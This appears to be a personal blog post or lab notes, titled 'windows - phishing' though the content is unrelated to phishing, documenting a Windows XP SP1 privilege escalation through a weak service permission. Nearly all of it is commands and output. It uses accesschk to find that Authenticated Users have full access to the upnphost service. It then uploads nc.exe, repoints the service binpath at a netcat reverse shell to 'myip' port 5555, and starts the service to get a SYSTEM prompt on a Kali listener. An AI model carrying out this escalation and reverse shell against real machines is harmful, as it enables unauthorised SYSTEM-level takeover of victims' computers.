---
layout: post
title:  "windows - phishing"
date:   2022-01-01
categories: linux
---

Microsoft Windows XP Professional

### 5.1.2600 Service Pack 1 Build 2600


```
https://sohvaxus.github.io/content/winxp-sp1-privesc.html
```

```
accesschk-2003-xp.exe /accepteula -uwcqv "Authenticated Users" *
```

```powershell
C:\Inetpub\wwwroot>accesschk-2003-xp.exe /accepteula -uwcqv "Authenticated Users" *
accesschk-2003-xp.exe /accepteula -uwcqv "Authenticated Users" *
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS
```

```
C:\Inetpub\wwwroot>accesschk-2003-xp.exe /accepteula -ucqv upnphost
accesschk-2003-xp.exe /accepteula -ucqv upnphost
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS
```

```bash
C:\Inetpub\wwwroot>sc qc upnphost
sc qc upnphost
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\inetpub\wwwroot\ns_shell.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : LocalSystem
```


```bash
C:\Inetpub\wwwroot>sc query SSDPSRV
sc query SSDPSRV

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        STATE              : 4  RUNNING 
                                (STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

## upload the nc.exe via ftp using binary option

```
binary
```

## reverse shell

```
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv myip 5555 -e C:\WINDOWS\System32\cmd.exe"

[SC] ChangeServiceConfig SUCCESS
```

```
C:\Inetpub\wwwroot>sc qc upnphost
sc qc upnphost
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Inetpub\wwwroot\nc.exe -nv myip 5555 -e C:\WINDOWS\System32\cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : LocalSystem
```

```
C:\Inetpub\wwwroot>net start upnphost
net start upnphost
```

## shell

```
┌──(kali㉿Zeus)-[~]
└─$ nc -nlvp 5555

C:\WINDOWS\system32>
